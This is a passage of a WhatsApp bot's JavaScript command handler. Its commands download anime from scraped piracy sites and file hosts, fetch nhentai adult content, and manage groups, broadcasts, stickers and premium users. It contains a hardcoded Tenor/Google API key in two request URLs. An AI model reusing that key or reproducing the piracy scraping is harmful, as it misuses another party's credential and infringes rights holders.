      text: `*OTAKUDESU SEARCH ANIME*\n\n${q}`,
      footer: botname,
      buttonText: "List Anime",
      sections: [{
    title: "OTAKUDESU SEARCH",
      rows: list
    }],
    listType: 1
    }
    const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m})
    } catch (err) {
      reply(jsonformat(err))
    }
    }
    break
  case prefix+'otaku-detail':  case prefix+'otakudesu-detail':  {
    if (args.length < 2) return reply(`OTAKUDESU DETAIL ANIME\n\n~usage: ${command} <samehadaku url>`)
    if (!isUrl(args[1]) && !args[1].includes('otakudesu')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari web otakudesu')
    if (!args[1].includes('anime')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari web otakudesu')
    try {
      let otaku = await axios.get(otakudesu + `/detail?url=${args[1]}`)
    let resul = otaku.data
    let result = resul.anime_detail
    let detail = result.detail
  let list = []
  for (let x of resul.episode_list) {
  list.push({
  title: `${x.episode_title}\n`,
  rowId: `${prefix}otaku-dl ${x.episode_url}`,
  description: `*Upload Date* : ${x.episode_date}`
  })
  }
  const listMessage = {
    text: `*OTAKUDESU ANIME DETAIL*\n\n${detail.join(`\n`)} \n${result.sinopsis}`, 
    footer: botname,
    buttonText: "Episode List",
    sections: [{
  title: "pilih episode yang kamu inginkan",
    rows: list
  }],
  listType: 1
  }
  await conn.sendMessage(from, listMessage, {quoted:m})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break
  case prefix+'otaku-dl':  case prefix+'otakudesu-dl':  case prefix+'otakudesu-download':{
    if (args.length < 2) return reply(`OTAKUDESU DOWNLOADER\n\n~usage: ${command} <otakudesu url eps>`)
    if (!isUrl(args[1]) && !args[1].includes('otakudesu')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari web otakudesu')
    try {
      let otaku = await axios.get(otakudesu + `/episode?url=${args[1]}`)
    let result = otaku.data
    let quality = result.quality
    let low = quality.low_quality
    let low_dl = low.download_links
    let medium = quality.medium_quality
    let medium_dl = medium.download_links
    let high = quality.high_quality
    let high_dl = high.download_links
  let list = []
  list.push({
  title: `Mp4 360P`,
  rowId: `${prefix}sendnime ${low_dl[0].link}`,
  description: `${low_dl[0].host}`
  },
  {
    title: `Mp4 480P`,
    rowId: `${prefix}sendnime ${medium_dl[0].link}`,
    description: `${medium_dl[0].host}`
    },
    {
      title: `Mp4 720P`,
      rowId: `${prefix}sendnime ${high_dl[0].link}`,
      description: `${high_dl[0].host}`
      })
  const listMessage = {
    text: `*OTAKUDESU DOWNLOAD EPISODE*\n\n*${result.title}*\nStream: ${result.streamLink}\n\n${args[1]}\n`,
    footer: botname,
    buttonText: "Pilih Resolusi",
    sections: [{
  title: "pilih resolusi yang kamu inginkan",
    rows: list
  }],
  listType: 1
  }
  await conn.sendMessage(from, listMessage, {quoted:m})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break

  // DOWNLOADER
  case prefix+'expand':{
    if (args.length < 2) return reply(`input url yang mau di Expand`)
    if(!isUrl(args[1])) return reply('Url tidak valid')
    try {
        await expandUrl(args[1]).then(async (exp) => {
            console.log(exp)
        reply(parseRes(exp, {
            title: "URL EXPAND",
          }))
    })
} catch(err){
    reply(jsonformat(err))
}
  }
  break
  case prefix+'sendnime':{
    if(!q) return 
    //console.log(q)
    try {
        if (args[1].includes("desudrive")) {
                    try {
                    expandUrl(args[1]).then(async (exp) => {
                        let res = await zippy2(exp.longUrl)
                            console.log(res)
                           await conn.sendMessage(from, {document:{url:res.url}, fileName:res.name, mimetype: res.mimetype}, {quoted:m}).catch ((err) => reply('Gagal saat mendownload File'))
                })
            } catch (err) {
              reply(jsonformat(err))
            }
                        } else if(args[1].includes('zippyshare')) {
                    try {
                        await zippy2(args[1]).then(async (res) => {
                        console.log(res)
                       await conn.sendMessage(from, 
                       {document:{url:res.url}, 
                       fileName:res.name, 
                       mimetype: res.mimetype}, 
                       {quoted:m}).catch ((err) => reply('Gagal saat mendownload File'))
                      })
                        } catch (err) {
                          reply(jsonformat(err))
                        }
                } else {
     expandUrl(args[1]).then(async (exp) => {
        if (exp.longUrl.includes("drive.google.com")) {
                try {
                let res = await GDrive(exp.longUrl)
                        console.log(res)
                       await conn.sendMessage(from,
                         {document:{url:res.downloadUrl},
                        fileName:res.fileName, mimetype: res.mimetype}, 
                        {quoted:m}).catch ((err) => reply('Gagal saat mendownload File'))
        } catch (err) {
          reply(jsonformat(err))
        }
        } else {
            let filename = decodeURIComponent(exp.longUrl.split("/").pop())
            await conn.sendMessage(m.chat,{
                document: {url:exp.longUrl},
                fileName: filename,
                mimetype: 'video/mp4',
            },{quoted:m}).catch ((err) => reply('Gagal saat mendownload File'))
        }
        })
    }
       } catch (err) {
      reply(jsonformat(err))
    }
  }
  break
  case prefix+'zs':  case prefix+'zp':   case prefix+'zippy': case prefix+'zippyshare': {
    if (args.length < 2) return reply(`*ZIPPYSHARE DOWNLOADER*\n\n~usage: ${command} <zippyshare url>\n~note: usahakan file nya tidak limit/kedaluarsa\n\n>> Jika ingin mendownload banyak file dari zippyshare bisa lansung menggunakan command ini dengan cara langsung menumpuk link dengan split koma(,) link,link,link\nExample: ${command} link1,link2,link3 dst`)
    if (!isUrl(args[1]) && !args[1].includes('zippyshare.com')) return reply('link yang kamu berikan tidak valid, usahakan file nya tidak limit/kedaluarsa')
    try {
        if (q.includes(',')) {
            const link_zippy = q.trim().split(',')
            for (let i = 0; i < link_zippy.length; i++) {
                const res = await zippy(link_zippy[i])
                try {
                    console.log(res)
                    console.log('Download & Uploading to Whatsapp...')
                    reply(parseRes(res, {
                        title: "ZIPPYSHARE DOWNLOADER",
                      }))
    await conn.sendMessage(from, {document:{url:res.url}, fileName:res.name, mimetype: res.mimetype}, {quoted:m}).catch ((err) => reply('Gagal saat mendownload File'))
                } catch (err) {
                    reply(`Gagal mengirim file ${link_zippy[i]}\nMungkin size file melebihi limit Whatsapp`)
                    console.log(err)
                }
            }
    } else {
  await zippy(args[1]).then(async (res) => {
    console.log(res)
    console.log('Download & Uploading to Whatsapp...')
    reply(parseRes(res, {
        title: "ZIPPYSHARE DOWNLOADER",
      }))
    await conn.sendMessage(from, {document:{url:res.url}, fileName:res.name, mimetype: res.mimetype}, {quoted:m}).catch ((err) => reply('Gagal saat mendownload File'))
  })
}
    } catch (err) {
      reply(jsonformat(err))
    }
  }
  break
  case prefix+'gd':  case prefix+'gdrive':{
   if (args.length < 2) return reply(`GDRIVE DOWNLOADER\n\n~usage: ${command} <gdrive url>\n~note: usahakan file nya tidak limit/kedaluarsa dan bukan link folder`)
    if (!isUrl(args[1]) && !args[1].includes('drive.google.com')) return reply('link yang kamu berikan tidak valid, usahakan file nya tidak limit/kedaluarsa dan bukan link folder')
    if (args[1].includes('folder')) return reply('link yang kamu berikan tidak valid, usahakan file nya tidak limit/kedaluarsa dan bukan link folder')
    try {
  await GDrive(args[1]).then(async (res) => {
    console.log(res)
    let captt = `-----[ *GDRIVE DOWNLOADER* ]-----
  
    *Name* : ${res.fileName}
    *Size* : ${res.fileSize}
    *Mimetype* : ${res.mimetype}
    
    `
    reply(captt)
    await sleep(1000)
    conn.sendMessage(from, {document:{url:res.downloadUrl}, fileName:res.fileName, mimetype: res.mimetype}, {quoted:m}).catch ((err) => reply('Gagal saat mendownload File'))
  })
    } catch (err) {
      reply(jsonformat(err))
    }
  }
  break
  case prefix+'mf':  case prefix+'mediafire': {
    if (args.length < 2) return reply(`MEDIAFIRE DOWNLOADER\n\n~usage: ${command} <mediafire url>\n~note: usahakan file nya tidak limit/kedaluarsa dan bukan link folder`)
    if (!isUrl(args[1]) && !args[1].includes('mediafire.com')) return reply('link yang kamu berikan tidak valid, usahakan file nya tidak limit/kedaluarsa dan bukan link folder')
    try {
  await mediafire2(args[1]).then(async (res) => {
    console.log(res)
    let captt = `-----[ *MEDIAFIRE DOWNLOADER* ]-----
  
    *Name* : ${res.fileName}
    *Size* : ${res.fileSize}
    *Mimetype* : ${res.mimetype}
    
    `
    reply(captt)
    await sleep(1000)
    conn.sendMessage(from, {document:{url:res.downloadUrl}, fileName:res.fileName, mimetype: res.mimetype}, {quoted:m}).catch ((err) => reply('Gagal saat mendownload File'))
  })
    } catch (err) {
      reply(jsonformat(err))
    }
  }
  break

            //nhentai
case prefix+'nhentai':{
    if (!m.isGroup) throw mess.group
    if (!isNsfw) return m.reply(mess.nsfw)
    if (!q) return reply(`Input code nuclear to get doujin file PDF.\n\n~Usage:\n${command} <code>\n~example\n${command} 177013`)
    let code = q
    console.log(`Searching Nhentai Metadata for code ${code}...`)
  await nhPDF(conn, from, code, m).catch((err) => m.reply(jsonformat(err)))
  }
  break
  case prefix+'nhrandom':{
    if (!m.isGroup) throw mess.group
    if (!isNsfw) return m.reply(mess.nsfw)
    //if (!q) return reply(`Input code nuclear to get doujin file PDF.\n\n~Usage:\n${command} <code>\n~example\n${command} 177013`)
    let nh = await axios.get('https://nhentai.myweebs.my.id/nhentai/random')
    let result = nh.data.data
    let code = result.id
    console.log(`Searching Nhentai Metadata for code ${code}...`)
  await nhPDF(conn, from, code, m).catch((err) => m.reply(jsonformat(err)))
  }
  break
  case prefix+'nhsearch':{
    if (!m.isGroup) throw mess.group
    if (!isNsfw) return m.reply(mess.nsfw)
    if (!q) return reply(`Input query!`)
    try {
    let nh = await axios.get(`https://nhentai.myweebs.my.id/nhentai/search?key=${q}`)
    let result = nh.data.data
  let list = []
  for (let x of result) {
  list.push({
  title: `${x.id} - ${x.title.english}\n`,
  rowId: `${prefix}nhentai ${x.id}`,
  description: `*Pages* : ${x.total}\n*Languages* : ${x.language}\n*Tags* : ${x.tags.join(', ')}`
  })
  }
  const listMessage = {
    text: `*NHENTAI SEARCH*\n\n${q}`,
    footer: botname,
    buttonText: "Click Here!",
    sections: [{
  title: "NHENTAI SEARCH",
    rows: list
  }],
  listType: 1
  }
  const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m})
  } catch (err) {
    m.reply(jsonformat(err))
  }
  }
  break
        case prefix+'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case prefix+'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case prefix+'setname': case prefix+'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await conn.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case prefix+'setdesc': case prefix+'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await conn.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case prefix+'setbotpp': case prefix+'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Send/Reply Image With Caption ${command}`
                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${command}`
                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${command}`
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                await conn.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case prefix+'setgrouppp': case prefix+'setgrupicon': case prefix+'setgcpp': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Send/Reply Image With Caption ${command}`
                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${command}`
                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${command}`
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                await conn.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case prefix+'tagall': {
                if (!m.isGroup) throw mess.group
                //if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins && !isCreator) throw mess.admin
let teks = `╚»˙·٠•●♥ Tag All ♥●•٠·˙«╝ 
 
 🌿 *Message : ${q ? q : 'empty'}*\n\n`
                for (let mem of participants) {
                teks += `• @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case prefix+'h':   case prefix+'hidetag': {
            if (!m.isGroup) throw mess.group
            //if (!isBotAdmins && !isCreator) throw mess.botAdmin
            if (!isAdmins && !isCreator) throw mess.admin
            conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
            }
            break
	    case prefix+'style': case prefix+'styletext': {
	        //if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // response when limit runs out
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Enter Query text!'
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `• *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
case prefix+'group': case prefix+'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[1] === 'close'){
                    await conn.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Successfully Closed The Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[1] === 'open'){
                    await conn.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Successfully Opened The Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                    let buttons = [
                        { buttonId: `${command} open`, buttonText: { displayText: 'ON' }, type: 1 },
                        { buttonId: `${command} close`, buttonText: { displayText: 'OFF' }, type: 1 }
                    ]
                    await conn.sendButtonText(m.chat, buttons, `Mode Group`, botname, m)

             }
            }
            break
            case prefix+'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[1] === 'open'){
                await conn.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[1] === 'close'){
                await conn.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
                let buttons = [
                    { buttonId: `${command} on`, buttonText: { displayText: 'ON' }, type: 1 },
                    { buttonId: `${command} off`, buttonText: { displayText: 'OFF' }, type: 1 }
                ]
                    await conn.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)

            }
            }
            break
case prefix+'mute': {
                if (!m.isGroup) throw mess.group
                //if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins && !isCreator) throw mess.admin
                if (args[1] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`It's Been Active Before`)
                db.data.chats[m.chat].mute = true
                m.reply(`${conn.user.name} has been muted in this group !`)
                } else if (args[1] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Not Activated Before`)
                db.data.chats[m.chat].mute = false
                m.reply(`${conn.user.name} has been unmuted in this group !`)
                } else {
                 let buttons = [
                        { buttonId: `${command} on`, buttonText: { displayText: 'ON' }, type: 1 },
                        { buttonId: `${command} off`, buttonText: { displayText: 'OFF' }, type: 1 }
                    ]
                    await conn.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
                }
             }
             break
case prefix+'chatinfo': {
if (!m.quoted) m.reply('Reply Message')
let msgg = await m.getQuotedObj()
if (!m.quoted.isBaileys) return m.reply('The message was not sent by a bot!')
let teks = ''
for (let i of msgg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `• @${i.userJid.split('@')[0]}\n`
teks += ` ┗━• *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} \n• *Status :* ${read ? 'Read' : 'Sent'}\n\n`
}
conn.sendTextWithMentions(m.chat, teks, m)
}
break
            case prefix+'linkgroup':   case prefix+'grouplink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await conn.groupInviteCode(m.chat)
                conn.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case prefix+'revoke': case prefix+'revokelink': {
            if (!m.isGroup) return m.reply(mess.group)
            if (!isBotAdmins) return m.reply(mess.botAdmin)
            if (!isAdmins && !isCreator) return m.reply(mess.admin)
            conn.groupRevokeInvite(m.chat)
            }
            break
            case prefix+'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins && !isCreator) throw mess.admin
                if (!text) throw 'Enter the value enable/disable'
                if (args[1] === 'enable') {
                    await conn.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[1] === 'disable') {
                    await conn.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case prefix+'delete': case prefix+'del': {
                if (!isAdmins && !isCreator) throw mess.admin
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'The message was not sent by a bot!'
                conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case prefix+'bctext': case prefix+'broadcasttext': case prefix+'broadcast':
			    if (!isCreator) throw mess.owner
		            if (!text) throw `Enter text`
		                            var data = await store.chats.all()
                            for (let i of data) {
                               conn.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            break
case prefix+'broadcastimage': case prefix+'bcimage': case prefix+'broadcastvideo': case prefix+'broadcastvid':
if(!isCreator) throw mess.owner
        if (!text) throw `enter text`
        let getGroups = await conn.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        m.reply(` Broadcasting in ${xeoncast.length} Group Chat, in ${xeoncast.length * 1.5} seconds`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${text}`
if(/image/.test(mime)) {
let media = await quoted.download()
await conn.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await conn.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        m.reply(`Successfuly Broadcasted in ${xeoncast.length} Groups`)      
        break
            case prefix+'q': case prefix+'quoted': {
		if (!m.quoted) return m.reply('Reply Message!!')
		let wokwol = await conn.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('The message you replied to does not contain a reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case prefix+'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `• *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `• *Name :* ${nama}\n• *User :* @${i.split('@')[0]}\n• *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 conn.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case prefix+'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `• *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await conn.groupMetadata(i)
                     teks += `• *Name :* ${metadata.subject}\n• *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n• *ID :* ${metadata.id}\n• *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n• *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 conn.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case prefix+'listonline': case prefix+'onlinelist': {
                    let id = args && /\d+\-\d+@g.us/.test(args[1]) ? args[1] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    conn.sendText(m.chat, 'Online Member:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
case prefix+'sticker': case prefix+'s': case prefix+'stc': case prefix+'stickergif': case prefix+'sgif': {
            //if (!quoted) throw `*Reply Video/Image With Caption* ${command}`
            if (isImage || isQuotedImage) {
                let media = await quoted.download()
                let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (isVideo || isQuotedVideo) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maximum 10 seconds!*')
                let media = await quoted.download()
                let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                reply(`*Send Image/Video With Caption* ${command}\nDuration *Video 1-9 Seconds*`)
                }
            }
            break
case prefix+'swm': case prefix+'stickerwm': case prefix+'wm': case prefix+'take': {  
    if (args.length < 2) return reply(`Penggunaan ${command} packname|author`)
    let packname1 = q.split('|')[0] ? q.split('|')[0] : q
    let author1 = q.split('|')[1] ? q.split('|')[1] : ``
    if (!packname1) return reply(`Penggunaan ${command} nama|author`)
    if (isImage || isQuotedImage) {
    let media = await quoted.download()
    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: packname1, author: author1 })
    await fs.unlinkSync(encmedia)
    } else if (isVideo || isQuotedVideo) {
    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximum 10 seconds!')
    let media = await quoted.download()
    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: packname1, author: author1 })
    await fs.unlinkSync(encmedia)
} else if (isQuotedSticker) {
    let media = await quoted.download()
    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: packname1, author: author1 })
    } else {
    m.reply(`Send Image/Video With Caption ${command}\nVideo Duration 1-9 Seconds`)
    }
    }
    break
    case prefix+'dellwm':
        if (isQuotedSticker) {
            try {
                let media = await quoted.download()
                let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname:  ' ', author: '' })
              } catch (err){
            reply(toJSON(err))
        }
        } else {
            reply(`reply pada sticker yang mau dihilangkan watermarknya dengan command ${command}`)
        }
        break
	case prefix+'stcmeme': case prefix+'stickermeme': case prefix+'smeme': {
if (!q) return reply(`custom meme sticker\n\nUsage: reply image/sticker with command ${command} <text1|text2>\nexample: ${command} kamu|cantik`)
if (args[1].startsWith('|')) return reply(`ERROR\n\nUsage: reply image/sticker with command ${command} <text1|text2>\nexample: ${command} kamu|cantik`)
var text1 = q.split('|')[0] ? q.split('|')[0] : (q.includes("|") ? '' : q)
 var text2 = q.split('|')[1] ? q.split('|')[1] : ''
var atas = text1.replace('\n','%5Cn').replace('?', '~q').replace('%', '~p').replace('&', '~a').replace('#', '~h').replace('/', '~s')
var bawah = text2.replace('\n','%5Cn').replace('?', '~q').replace('%', '~p').replace('&', '~a').replace('#', '~h').replace('/', '~s')
if (isImage || isQuotedImage) {
media = await conn.downloadAndSaveMediaMessage(quoted)
tolink = await uptotele(media)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${tolink}`
memek = await conn.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(media)
} else if (isQuotedSticker) {
    mediah = await conn.downloadAndSaveMediaMessage(quoted, 'sticker')
    let ran = getRandom('.png')
    exec(`ffmpeg -i ${mediah} ${ran}`, async (err) => {
      fs.unlinkSync(mediah)
      if (err) return reply('Gagal :V')
    tolink = await uptotele(ran)
    meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${tolink}`
    memek = await conn.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
    await fs.unlinkSync(ran)
    })
} else {
    m.reply(`ERROR\n\nUsage: reply image/sticker with command ${command} <text1|text2>\nexample: ${command} kamu|cantik`)
    }
}
break
            case prefix+'ebinary': {
            if (!text) throw `Example : ${command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case prefix+'dbinary': {
            if (!text) throw `Example : ${command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
case prefix+'buypreim':
m.reply(`Chat owner bro, please type .owner`)
break
  case prefix+'addprem':
if (!isCreator) throw mess.owner
if (!q) return m.reply(`Enter the sample number\n\nExample: \n${prefix}${command.split(prefix)[1]} 916909137213`)
if(isNaN(q)) return await m.reply('must be a number')
  if (q.includes(`+`)) return m.reply('Do not use + direct number 9169****')
prmi = args.join(" ")
premium.push(`${prmi}@s.whatsapp.net`)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(premium))
m.reply(`* PREMIUM ADDED *\n\n• *ID*: ${prmi}`)
break
case prefix+'delprem':
 case prefix+'dellprem':
if (!isCreator) throw mess.owner
  if (!q) return m.reply(`Enter the Number\n\nExample: \n${prefix}${command.split(prefix)[1]} 916909137213`)
  if(isNaN(q)) return await m.reply('must be a number')
  if (q.includes(`+`)) return m.reply('Do not use + direct number 9169****')
  prmin = `${q}@s.whatsapp.net`
anul = banned.indexOf(prmin)
premium.splice(anul, 1)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(premium))
m.reply(`Success deleting premium ${prmi}`)
break
            case prefix+'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${command} 😅+🤔`
		if (!emoji2) throw `Example : ${command} 😅+🤔`
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	case prefix+'emojimix2': {
	    if (!text) throw `Example : ${command} 😅+🤔`
		let anumix2 = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anumix2.results) {
		    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
         case prefix+'tts':{
         	if (!text) throw `Example : ${command} text`
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`)
             conn.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
         	}
         break 
case prefix+'tourl': {
    //if (!quoted) throw 'Reply Image/audio/video'
    if (isImage || isQuotedImage) {
    let media = await conn.downloadAndSaveMediaMessage(quoted, 'image')
    reply('Uploading image to telegra.ph')
    let tourl = await uptotele(media)
reply(tourl)
fs.unlinkSync(media)
    } else if (isQuotedSticker) {
    media = await conn.downloadAndSaveMediaMessage(quoted, 'sticker')
    let ran = getRandom('.png')
    exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
      fs.unlinkSync(media)
      reply('Uploading sticker to imgbb.com')
      if (err) return reply('Gagal :V')
    tourl = await uptoibb(ran)
    reply(tourl)
    fs.unlinkSync(ran)
    })
    } else if (isVideo || isQuotedVideo) {
        let media = await conn.downloadAndSaveMediaMessage(quoted, 'mp4')
        reply('Uploading video to anonfiles.com')
        let tourl = await uptoanon(media)
    reply(tourl.url.short)
    fs.unlinkSync(media)
    } else if (isQuotedAudio) {
        let media = await conn.downloadAndSaveMediaMessage(quoted, 'mp3')
        reply('Uploading audio to anonfiles.com')
        let tourl = await uptoanon(media)
    reply(tourl.url.short)
    fs.unlinkSync(media)
    } else if (isQuotedDocument) {
        let media = await conn.downloadAndSaveMediaMessage(quoted)
        reply('Uploading document to anonfiles.com')
        let tourl = await uptoanon(media)
    reply(tourl.url.short)
    fs.unlinkSync(media)
    } else {
        reply(`Kirim/reply file (gambar, sticker, video, audio) dengan caption ${command}`)
     }
}
break
case prefix+'toimage': case prefix+'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Reply sticker with caption *${command}*`
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let bufferimg13x = fs.readFileSync(ran)
